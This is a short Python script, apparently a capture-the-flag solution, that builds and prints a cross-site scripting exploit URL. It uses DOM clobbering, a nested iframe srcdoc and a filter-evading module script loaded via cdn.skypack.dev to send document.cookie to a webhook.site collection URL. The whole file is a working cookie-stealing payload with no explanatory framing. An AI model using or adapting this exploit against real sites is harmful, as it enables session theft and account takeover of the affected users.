from urllib.parse import quote

def escape(s):
    d = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&apos;",
        "`": "&#96;",
        "+": "&#43;",
    }
    return "".join(d.get(c, c) for c in s)

URL = "http://proxy/?name="

payload = """<a id=notes href=A><a id=notes name="![<iframe srcdoc='[HTML]'>](x>>)">"""

script = quote("top['location']['assign'](`https://webhook.site/178f2f32-8974-48e8-bf7d-d77f3e95dd19?${document['cookie']}`)").replace(".", "%5cx2e")
script = "https://cdn.skypack.dev/dompurify/%252f%3F%27;"+script+"%2f%2f"
payload = payload.replace("[HTML]", escape("<script/type=\"module\"/src=\""+script+"\"/></script>"))

print(URL + quote(payload))